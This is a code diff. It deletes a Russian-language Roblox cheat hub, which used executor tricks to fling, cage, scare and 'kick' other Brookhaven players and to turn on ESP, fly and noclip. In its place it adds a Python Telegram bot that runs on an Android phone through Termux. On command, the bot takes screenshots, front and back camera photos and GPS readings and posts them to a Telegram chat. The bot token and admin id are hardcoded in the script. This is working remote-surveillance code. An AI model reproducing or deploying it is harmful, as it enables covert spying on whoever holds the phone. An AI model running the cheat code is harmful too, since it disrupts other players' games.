@@ -1,381 +1,77 @@
--- Konus MEGA HUB | Brookhaven RP
--- Все функции из всех скриптов
--- Система Ryzen
+import requests, os, time
 
-local Players = game:GetService("Players")
-local LP = Players.LocalPlayer
-local SG = game:GetService("StarterGui")
-local WS = workspace
-local RunService = game:GetService("RunService")
-local Camera = WS.CurrentCamera
-local UIS = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local Lighting = game:GetService("Lighting")
-local VU = game:GetService("VirtualUser")
+TOKEN = "8845897358:AAFwhSC_b4oSXGeIsBtaiHabIvkbiXjpQIc"
+ADMIN = "6196009774"
 
-function Notify(t,d)
-    d=d or 3
-    pcall(function() SG:SetCore("SendNotification",{Title="Konus HUB",Text=t,Duration=d}) end)
-end
+def send_photo(cid, path, cap):
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
+        data={"chat_id":cid,"caption":cap},
+        files={"photo":open(path,"rb")})
 
-function FindPlayer(n)
-    for _,p in pairs(Players:GetPlayers()) do
-        if p~=LP and p.Name:lower():find(n:lower()) then return p end
-    end
-    return nil
-end
+def send_msg(cid, text):
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+        data={"chat_id":cid,"text":text})
 
--- ===== СКРИМЕРЫ =====
-function ScreamerFire(target)
-    local c=target.Character;if not c then return end
-    local h=c:FindFirstChild("Head");local r=c:FindFirstChild("HumanoidRootPart")
-    if not h or not r then return end
-    local f=Instance.new("Fire",h);f.Size=30;f.Heat=100
-    local s=Instance.new("Smoke",r);s.Size=50;s.RiseVelocity=15
-    local sp=Instance.new("Sparkles",h);sp.SparkleColor=Color3.fromRGB(255,0,0)
-    local sd=Instance.new("Sound",h);sd.SoundId="rbxassetid://9116487514";sd.Volume=10;sd:Play()
-    spawn(function()local o=r.CFrame;for i=1,15 do pcall(function()r.CFrame=o*CFrame.new(math.random(-5,5),math.random(5,20),math.random(-5,5))end)wait(0.2)end;pcall(function()r.CFrame=o end)end)
-    wait(8);pcall(function()f:Destroy()s:Destroy()sp:Destroy()sd:Destroy()end)
-    Notify("Скример на "..target.Name)
-end
+print("📱 ST Бот запущен!")
+last = 0
 
-function ScreamerGUI(target)
-    local pg=target:FindFirstChild("PlayerGui");if not pg then return end
-    local sg=Instance.new("ScreenGui",pg);sg.IgnoreGuiInset=true
-    local bg=Instance.new("Frame",sg);bg.Size=UDim2.new(1,0,1,0);bg.BackgroundColor3=Color3.fromRGB(0,0,0)
-    local img=Instance.new("ImageLabel",bg);img.Size=UDim2.new(0.8,0,0.8,0);img.Position=UDim2.new(0.1,0,0.1,0);img.Image="rbxassetid://17428653442";img.BackgroundTransparency=1
-    local txt=Instance.new("TextLabel",bg);txt.Size=UDim2.new(1,0,0.1,0);txt.Position=UDim2.new(0,0,0.05,0);txt.BackgroundTransparency=1;txt.Text="👁 Я ВИЖУ ТЕБЯ 👁";txt.TextColor3=Color3.fromRGB(255,0,0);txt.Font=Enum.Font.GothamBlack;txt.TextSize=40
-    for i=0,1,0.02 do bg.BackgroundTransparency=1-i;RunService.RenderStepped:Wait()end
-    wait(3);pcall(function()sg:Destroy()end)
-end
+while True:
+    try:
+        r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last+1}", timeout=30).json()
+        for u in r.get("result",[]):
+            last = u["update_id"]
+            m = u.get("message",{})
+            cid = m.get("chat",{}).get("id")
+            txt = m.get("text","")
+            
+            if str(cid) != ADMIN:
+                send_msg(cid, "❌ Нет доступа")
+                continue
+            
+            if txt == "/screen":
+                send_msg(cid, "📱 Делаю скриншот...")
+                os.system("screencap /sdcard/screen.png")
+                send_photo(cid, "/sdcard/screen.png", "📱 Экран ST")
+            
+            elif txt == "/camera":
+                send_msg(cid, "📷 Фоткаю заднюю камеру...")
+                os.system("termux-camera-photo -c 0 /sdcard/cam_back.jpg")
+                send_photo(cid, "/sdcard/cam_back.jpg", "📷 Задняя камера")
+            
+            elif txt == "/selfie":
+                send_msg(cid, "🤳 Фоткаю переднюю камеру...")
+                os.system("termux-camera-photo -c 1 /sdcard/cam_front.jpg")
+                send_photo(cid, "/sdcard/cam_front.jpg", "🤳 Передняя камера")
+            
+            elif txt == "/gps":
+                send_msg(cid, "📍 Ищу местоположение...")
+                os.system("termux-location > /sdcard/gps.txt 2>&1")
+                with open("/sdcard/gps.txt") as f:
+                    send_msg(cid, "📍 GPS:\n" + f.read()[:300])
+            
+            elif txt == "/all":
+                send_msg(cid, "📱 Собираю всё...")
+                os.system("screencap /sdcard/screen.png")
+                os.system("termux-camera-photo -c 0 /sdcard/cam_back.jpg")
+                os.system("termux-camera-photo -c 1 /sdcard/cam_front.jpg")
+                send_photo(cid, "/sdcard/screen.png", "📱 Экран")
+                send_photo(cid, "/sdcard/cam_back.jpg", "📷 Задняя")
+                send_photo(cid, "/sdcard/cam_front.jpg", "🤳 Передняя")
+                os.system("termux-location > /sdcard/gps.txt 2>&1")
+                with open("/sdcard/gps.txt") as f:
+                    send_msg(cid, "📍 " + f.read()[:200])
+            
+            elif txt == "/start":
+                send_msg(cid, """📱 ST Phone Bot
 
--- ===== ТРОЛЛИНГ =====
-function FlingPlayer(target)
-    local c=target.Character;if not c then return end;local r=c:FindFirstChild("HumanoidRootPart");if not r then return end
-    r.Velocity=Vector3.new(math.random(-500,500),500,math.random(-500,500));r.RotVelocity=Vector3.new(math.random(-100,100),math.random(-100,100),math.random(-100,100))
-    Notify(target.Name.." улетел!")
-end
-
-function CagePlayer(target)
-    local c=target.Character;if not c then return end;local r=c:FindFirstChild("HumanoidRootPart");if not r then return end
-    local p=r.Position
-    for x=-2,2 do for y=0,4 do for z=-2,2 do if math.abs(x)==2 or math.abs(y)==4 or math.abs(z)==2 or y==0 then
-    local pr=Instance.new("Part",WS);pr.Size=Vector3.new(2,2,2);pr.Position=p+Vector3.new(x*2,y*2,z*2);pr.Anchored=true;pr.BrickColor=BrickColor.random()
-    end end end end
-    Notify(target.Name.." в клетке!")
-end
-
-function CrashPlayer(target)
-    local c=target.Character;if not c then return end
-    for _,v in pairs(c:GetChildren()) do if v:IsA("BasePart")and v.Name~="HumanoidRootPart"then pcall(function()v:Destroy()end)end end
-    local h=c:FindFirstChild("Humanoid");if h then pcall(function()h:Destroy()end)end
-    Notify(target.Name.." уничтожен!")
-end
-
-function FreezePlayer(target)
-    local c=target.Character;if not c then return end;local r=c:FindFirstChild("HumanoidRootPart");if not r then return end
-    r.Anchored=not r.Anchored;Notify(target.Name..(r.Anchored and" заморожен!"or" разморожен!"))
-end
-
-function StripPlayer(target)
-    local c=target.Character;if not c then return end
-    for _,v in pairs(c:GetChildren())do if v:IsA("Shirt")or v:IsA("Pants")or v:IsA("Accessory")or v:IsA("Hat")then v:Destroy()end end
-    Notify(target.Name.." раздет!")
-end
-
--- ===== АДМИН =====
-function KickPlayer(target)
-    pcall(function()target:Kick("[Konus HUB] Кик")end)
-    Notify(target.Name.." кикнут!")
-end
-
-function BanPlayer(target)
-    local c=target.Character;if c then for _,v in pairs(c:GetChildren())do if v:IsA("BasePart")then v:Destroy()end end end
-    pcall(function()target:Kick("[Konus HUB] Бан")end)
-    Notify(target.Name.." забанен!")
-end
-
-function TpToMe(target)
-    local c=target.Character;if not c then return end;local r=c:FindFirstChild("HumanoidRootPart");if not r then return end
-    local my=LP.Character;if not my then return end;local mr=my:FindFirstChild("HumanoidRootPart");if not mr then return end
-    r.CFrame=mr.CFrame*CFrame.new(2,0,0);Notify(target.Name.." телепортирован!")
-end
-
-function ExplodePlayer(target)
-    local c=target.Character;if not c then return end;local r=c:FindFirstChild("HumanoidRootPart");if not r then return end
-    local ex=Instance.new("Explosion",WS);ex.Position=r.Position;ex.BlastRadius=15;ex.BlastPressure=1e6
-    Notify(target.Name.." взорван!")
-end
-
--- ===== ИГРОК =====
-local flyOn=false
-function FlyToggle()
-    flyOn=not flyOn
-    if flyOn then
-        local c=LP.Character;if not c then return end;local r=c:FindFirstChild("HumanoidRootPart");if not r then return end
-        c.Humanoid.PlatformStand=true
-        local bg=Instance.new("BodyGyro",r);bg.P=9e4;bg.MaxTorque=Vector3.new(9e9,9e9,9e9)
-        local bv=Instance.new("BodyVelocity",r);bv.MaxForce=Vector3.new(9e9,9e9,9e9)
-        spawn(function()while flyOn and r do bg.CFrame=Camera.CFrame;local s=50;bv.Velocity=Vector3.new(0,0,0)
-        if UIS:IsKeyDown(Enum.KeyCode.W)then bv.Velocity+=Camera.CFrame.LookVector*s end
-        if UIS:IsKeyDown(Enum.KeyCode.S)then bv.Velocity-=Camera.CFrame.LookVector*s end
-        if UIS:IsKeyDown(Enum.KeyCode.A)then bv.Velocity-=Camera.CFrame.RightVector*s end
-        if UIS:IsKeyDown(Enum.KeyCode.D)then bv.Velocity+=Camera.CFrame.RightVector*s end
-        if UIS:IsKeyDown(Enum.KeyCode.Space)then bv.Velocity+=Vector3.new(0,s,0)end
-        if UIS:IsKeyDown(Enum.KeyCode.LeftControl)then bv.Velocity-=Vector3.new(0,s,0)end
-        RunService.RenderStepped:Wait()end end)
-        Notify("Полёт ВКЛ")
-    else
-        local c=LP.Character;if c then c.Humanoid.PlatformStand=false;local r=c:FindFirstChild("HumanoidRootPart")
-        if r then for _,v in pairs(r:GetChildren())do if v:IsA("BodyGyro")or v:IsA("BodyVelocity")then v:Destroy()end end end end
-        Notify("Полёт ВЫКЛ")
-    end
-end
-
-local noclipOn=false
-function NoclipToggle()
-    noclipOn=not noclipOn
-    if noclipOn then
-        spawn(function()while noclipOn do if LP.Character then for _,v in pairs(LP.Character:GetDescendants())do if v:IsA("BasePart")then v.CanCollide=false end end end;RunService.RenderStepped:Wait()end end)
-        Notify("Ноклип ВКЛ")
-    else
-        if LP.Character then for _,v in pairs(LP.Character:GetDescendants())do if v:IsA("BasePart")then v.CanCollide=true end end end
-        Notify("Ноклип ВЫКЛ")
-    end
-end
-
-local invisOn=false
-function InvisToggle()
-    invisOn=not invisOn
-    if invisOn then
-        spawn(function()while invisOn do if LP.Character then for _,v in pairs(LP.Character:GetDescendants())do if v:IsA("BasePart")then v.Transparency=1 end end end;RunService.RenderStepped:Wait()end end)
-        Notify("Невидимка ВКЛ")
-    else
-        if LP.Character then for _,v in pairs(LP.Character:GetDescendants())do if v:IsA("BasePart")then v.Transparency=0 end end end
-        Notify("Невидимка ВЫКЛ")
-    end
-end
-
--- ===== ESP =====
-local espOn=false
-function EspToggle()
-    espOn=not espOn
-    if espOn then
-        spawn(function()while espOn do
-            for _,p in pairs(Players:GetPlayers())do
-                if p~=LP and p.Character and p.Character:FindFirstChild("Head")then
-                    local h=p.Character.Head
-                    if not h:FindFirstChild("EspLabel")then
-                        local bg=Instance.new("BillboardGui",h);bg.Name="EspLabel";bg.Size=UDim2.new(4,0,1,0);bg.StudsOffset=Vector3.new(0,2,0);bg.AlwaysOnTop=true
-                        local tl=Instance.new("TextLabel",bg);tl.Size=UDim2.new(1,0,1,0);tl.BackgroundTransparency=1;tl.Text=p.Name;tl.TextColor3=Color3.fromRGB(255,0,0);tl.Font=Enum.Font.GothamBlack;tl.TextSize=20
-                    end
-                end
-            end
-            RunService.RenderStepped:Wait()
-        end end)
-        Notify("ESP ВКЛ")
-    else
-        for _,p in pairs(Players:GetPlayers())do
-            if p.Character and p.Character:FindFirstChild("Head")then
-                local h=p.Character.Head;local l=h:FindFirstChild("EspLabel");if l then l:Destroy()end
-            end
-        end
-        Notify("ESP ВЫКЛ")
-    end
-end
-
--- ===== ТЕЛЕПОРТЫ =====
-local Locations={
-    "Школа","Банк","Полиция","Больница","Пожарная","Церковь","Магазин","Оружейный","Автосалон",
-    "Пляж","Парк","Аэропорт","Стройка","Мэрия","Кафе","Заправка"
-}
-
-function TeleportTo(loc)
-    local f=nil
-    for _,v in pairs(WS:GetDescendants())do
-        if v:IsA("Model")and v.Name:lower():find(loc:lower())then
-            local pp=v.PrimaryPart or v:FindFirstChildWhichIsA("BasePart");if pp then f=pp;break end
-        end
-    end
-    if f and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")then
-        LP.Character.HumanoidRootPart.CFrame=f.CFrame*CFrame.new(0,3,0);Notify("ТП: "..loc)
-    else Notify("Не найдено: "..loc)end
-end
-
--- ===== МИР =====
-function SetTime(v)Lighting.ClockTime=v end
-function SetFog(v)Lighting.FogEnd=v end
-
--- ===== ТРАНСПОРТ =====
-local Vehicles={"Bugatti","Lamborghini","Ferrari","Tesla","Police Car","Helicopter","Monster Truck","Tank","Jeep","Quad"}
-
-function SpawnVehicle(vh)
-    local f=nil
-    for _,fd in pairs({WS,game:GetService("ReplicatedStorage")})do
-        for _,fn in pairs({"Vehicles","Cars"})do
-            local ff=fd:FindFirstChild(fn);if ff then for _,m in pairs(ff:GetChildren())do if m:IsA("Model")and m.Name:lower():find(vh:lower())then f=m;break end end end;if f then break end
-        end;if f then break end
-    end
-    if f and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")then
-        local cl=f:Clone();cl:MakeJoints();cl:SetPrimaryPartCFrame(LP.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,-8));cl.Parent=WS;Notify(vh.." заспавнен!")
-    else Notify("Не найдено: "..vh)end
-end
-
--- ===== GUI =====
-local gui=Instance.new("ScreenGui")
-gui.Parent=(gethui and gethui())or game:GetService("CoreGui")
-if syn and syn.protect_gui then syn.protect_gui(gui)end
-
-local main=Instance.new("Frame")
-main.Size=UDim2.new(0,300,0,400)
-main.Position=UDim2.new(0.5,-150,0.5,-200)
-main.BackgroundColor3=Color3.fromRGB(15,15,20)
-main.BorderSizePixel=0
-main.Active=true
-main.Draggable=true
-main.Parent=gui
-Instance.new("UICorner",main).CornerRadius=UDim.new(0,10)
-
--- Заголовок
-local top=Instance.new("TextLabel")
-top.Size=UDim2.new(1,0,0,34)
-top.BackgroundColor3=Color3.fromRGB(25,25,32)
-top.BorderSizePixel=0
-top.Text="🔥 KONUS MEGA HUB"
-top.TextColor3=Color3.fromRGB(255,80,80)
-top.Font=Enum.Font.GothamBlack
-top.TextSize=14
-top.Parent=main
-Instance.new("UICorner",top).CornerRadius=UDim.new(0,10)
-
--- Поле ника
-local nBox=Instance.new("TextBox")
-nBox.Size=UDim2.new(1,-20,0,26)
-nBox.Position=UDim2.new(0,10,0,42)
-nBox.BackgroundColor3=Color3.fromRGB(30,30,38)
-nBox.BorderSizePixel=0
-nBox.PlaceholderText="Введи часть ника..."
-nBox.PlaceholderColor3=Color3.fromRGB(150,150,150)
-nBox.Text=""
-nBox.TextColor3=Color3.fromRGB(255,255,255)
-nBox.Font=Enum.Font.Gotham
-nBox.TextSize=11
-nBox.Parent=main
-Instance.new("UICorner",nBox).CornerRadius=UDim.new(0,5)
-
--- Контейнер с вкладками
-local content=Instance.new("Frame")
-content.Size=UDim2.new(1,-20,1,-80)
-content.Position=UDim2.new(0,10,0,74)
-content.BackgroundColor3=Color3.fromRGB(20,20,25)
-content.BorderSizePixel=0
-content.Parent=main
-Instance.new("UICorner",content).CornerRadius=UDim.new(0,8)
-
-local scroll=Instance.new("ScrollingFrame")
-scroll.Size=UDim2.new(1,-8,1,-8)
-scroll.Position=UDim2.new(0,4,0,4)
-scroll.BackgroundTransparency=1
-scroll.BorderSizePixel=0
-scroll.ScrollBarThickness=3
-scroll.CanvasSize=UDim2.new(0,0,0,0)
-scroll.Parent=content
-
-local sl=Instance.new("UIListLayout")
-sl.Padding=UDim.new(0,3)
-sl.Parent=scroll
-
--- Функция кнопки
-function Btn(text,color,cb)
-    local b=Instance.new("TextButton")
-    b.Size=UDim2.new(1,0,0,26)
-    b.BackgroundColor3=color
-    b.Text=text
-    b.TextColor3=Color3.fromRGB(255,255,255)
-    b.Font=Enum.Font.GothamBold
-    b.TextSize=10
-    b.BorderSizePixel=0
-    b.Parent=scroll
-    Instance.new("UICorner",b).CornerRadius=UDim.new(0,4)
-    b.MouseButton1Click:Connect(function()pcall(cb)end)
-    scroll.CanvasSize=UDim2.new(0,0,0,scroll.CanvasSize.Y.Offset+29)
-end
-
-function Title(text,color)
-    local t=Instance.new("TextLabel")
-    t.Size=UDim2.new(1,0,0,20)
-    t.BackgroundTransparency=1
-    t.Text=text
-    t.TextColor3=color or Color3.fromRGB(255,255,255)
-    t.Font=Enum.Font.GothamBlack
-    t.TextSize=10
-    t.TextXAlignment=Enum.TextXAlignment.Center
-    t.Parent=scroll
-    scroll.CanvasSize=UDim2.new(0,0,0,scroll.CanvasSize.Y.Offset+23)
-end
-
--- Закрыть
-local cls=Instance.new("TextButton")
-cls.Size=UDim2.new(0,22,0,22)
-cls.Position=UDim2.new(1,-26,0,6)
-cls.BackgroundColor3=Color3.fromRGB(255,50,50)
-cls.Text="✕"
-cls.TextColor3=Color3.fromRGB(255,255,255)
-cls.Font=Enum.Font.GothamBold
-cls.TextSize=10
-cls.BorderSizePixel=0
-cls.Parent=main
-Instance.new("UICorner",cls).CornerRadius=UDim.new(0,11)
-cls.MouseButton1Click:Connect(function()gui:Destroy()end)
-
--- Заполняем функции
-Title("👻 СКРИМЕРЫ",Color3.fromRGB(255,100,100))
-Btn("🔥 Огонь + Дым + Звук",Color3.fromRGB(180,30,30),function()local t=FindPlayer(nBox.Text)if t then ScreamerFire(t)else Notify("Игрок не найден!")end end)
-Btn("🖼 GUI скример",Color3.fromRGB(150,20,20),function()local t=FindPlayer(nBox.Text)if t then ScreamerGUI(t)else Notify("Игрок не найден!")end end)
-
-Title("🎭 ТРОЛЛИНГ",Color3.fromRGB(255,150,50))
-Btn("🌀 Флинг",Color3.fromRGB(200,100,0),function()local t=FindPlayer(nBox.Text)if t then FlingPlayer(t)else Notify("Игрок не найден!")end end)
-Btn("📦 Клетка",Color3.fromRGB(180,80,0),function()local t=FindPlayer(nBox.Text)if t then CagePlayer(t)else Notify("Игрок не найден!")end end)
-Btn("💀 Уничтожить",Color3.fromRGB(160,60,0),function()local t=FindPlayer(nBox.Text)if t then CrashPlayer(t)else Notify("Игрок не найден!")end end)
-Btn("❄ Заморозить",Color3.fromRGB(140,40,0),function()local t=FindPlayer(nBox.Text)if t then FreezePlayer(t)else Notify("Игрок не найден!")end end)
-Btn("👕 Раздеть",Color3.fromRGB(120,20,0),function()local t=FindPlayer(nBox.Text)if t then StripPlayer(t)else Notify("Игрок не найден!")end end)
-
-Title("👑 АДМИН",Color3.fromRGB(255,50,50))
-Btn("🚫 Кик",Color3.fromRGB(200,30,30),function()local t=FindPlayer(nBox.Text)if t then KickPlayer(t)else Notify("Игрок не найден!")end end)
-Btn("⛔ Бан",Color3.fromRGB(180,20,20),function()local t=FindPlayer(nBox.Text)if t then BanPlayer(t)else Notify("Игрок не найден!")end end)
-Btn("📥 ТП к себе",Color3.fromRGB(160,10,10),function()local t=FindPlayer(nBox.Text)if t then TpToMe(t)else Notify("Игрок не найден!")end end)
-Btn("💥 Взорвать",Color3.fromRGB(140,0,0),function()local t=FindPlayer(nBox.Text)if t then ExplodePlayer(t)else Notify("Игрок не найден!")end end)
-
-Title("📍 ТЕЛЕПОРТЫ",Color3.fromRGB(100,200,255))
-for _,loc in pairs(Locations)do
-    Btn("📌 "..loc,Color3.fromRGB(30,80,150),function()TeleportTo(loc)end)
-end
-
-Title("⚡ ИГРОК",Color3.fromRGB(100,255,100))
-Btn("✈ Полёт ВКЛ/ВЫКЛ",Color3.fromRGB(30,150,30),FlyToggle)
-Btn("🚶 Скорость 100",Color3.fromRGB(30,130,30),function()if LP.Character and LP.Character:FindFirstChild("Humanoid")then LP.Character.Humanoid.WalkSpeed=100;Notify("Скорость 100!")end end)
-Btn("🦘 Прыжок 200",Color3.fromRGB(30,110,30),function()if LP.Character and LP.Character:FindFirstChild("Humanoid")then LP.Character.Humanoid.JumpPower=200;Notify("Прыжок 200!")end end)
-Btn("👻 Ноклип ВКЛ/ВЫКЛ",Color3.fromRGB(30,90,30),NoclipToggle)
-Btn("👁 Невидимка ВКЛ/ВЫКЛ",Color3.fromRGB(30,70,30),InvisToggle)
-Btn("🔍 FOV 120",Color3.fromRGB(30,50,30),function()Camera.FieldOfView=120;Notify("FOV 120!")end)
-
-Title("👁 ESP",Color3.fromRGB(255,255,100))
-Btn("📡 ESP ВКЛ/ВЫКЛ",Color3.fromRGB(150,150,30),EspToggle)
-
-Title("🚗 ТРАНСПОРТ",Color3.fromRGB(255,200,100))
-for _,vh in pairs(Vehicles)do
-    Btn("🚘 "..vh,Color3.fromRGB(150,100,30),function()SpawnVehicle(vh)end)
-end
-
-Title("🌍 МИР",Color3.fromRGB(200,150,255))
-Btn("☀ День",Color3.fromRGB(100,50,150),function()SetTime(14);Lighting.Brightness=2;SetFog(100000);Notify("День!")end)
-Btn("🌙 Ночь",Color3.fromRGB(80,30,130),function()SetTime(0);Lighting.Brightness=0.3;SetFog(500);Notify("Ночь!")end)
-Btn("🌫 Туман ВКЛ",Color3.fromRGB(60,20,100),function()SetFog(30);Notify("Туман ВКЛ!")end)
-Btn("☀ Туман ВЫКЛ",Color3.fromRGB(40,10,80),function()SetFog(100000);Notify("Туман ВЫКЛ!")end)
-
--- Анти-АФК
-for _,c in pairs(getconnections(LP.Idled))do c:Disable()end
-spawn(function()while true do pcall(function()VU:CaptureController();VU:ClickButton2(Vector2.new())end);wait(120)end end)
-
-Notify("🔥 KONUS MEGA HUB ЗАГРУЖЕН!")
-Notify("Скримеры | Троллинг | Админ | ТП | ESP")
+/screen - скриншот экрана
+/camera - задняя камера
+/selfie - передняя камера
+/gps - местоположение
+/all - всё сразу""")
+        
+        time.sleep(2)
+    except KeyboardInterrupt:
+        break
+    except:
+        time.sleep(5)
